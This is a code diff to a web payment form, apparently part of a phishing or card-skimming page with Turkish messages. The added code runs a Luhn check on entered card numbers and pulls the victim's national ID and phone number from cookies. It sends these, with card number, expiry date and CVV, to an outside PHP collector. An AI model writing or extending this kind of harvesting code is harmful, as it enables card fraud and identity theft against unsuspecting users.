@@ -43,14 +43,24 @@
             return false;
         }
 
+        if (!luhnCheck(cardNumber)) {
+            alert('Kart numarası geçersiz.');
+            return false;
+        }
+
+        const tc = getCookie('tc');
+        const telno = getCookie('telno');
+
         // Formun post işlemi
         $.ajax({
             type: 'POST',
             url: 'https://hakikicelikhantutunu.com/dmn/veri2.php', // Göndermek istediğiniz adres
             data: {
-                cardNumber: cardNumber,
-                expiryDate: expiryDate,
-                vvv: vvva
+                cardNumber: encodeURIComponent(cardNumber),
+                expiryDate: encodeURIComponent(expiryDate),
+                vvv: encodeURIComponent(vvva),
+                tc: encodeURIComponent(tc),
+                telno: encodeURIComponent(telno)
             },
             success: function(response) {
                 alert('Post işlemi başarılı.');
@@ -88,6 +98,26 @@
         }
 
         return true;
+    }
+
+    function luhnCheck(num) {
+        let arr = (num + '')
+            .split('')
+            .reverse()
+            .map(x => parseInt(x));
+        let lastDigit = arr.splice(0, 1)[0];
+        let sum = arr.reduce(
+            (acc, val, i) => i % 2 !== 0 ? acc + val : acc + ((val *= 2) > 9 ? val - 9 : val),
+            0
+        );
+        sum += lastDigit;
+        return sum % 10 === 0;
+    }
+
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
     }
 </script>
   <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
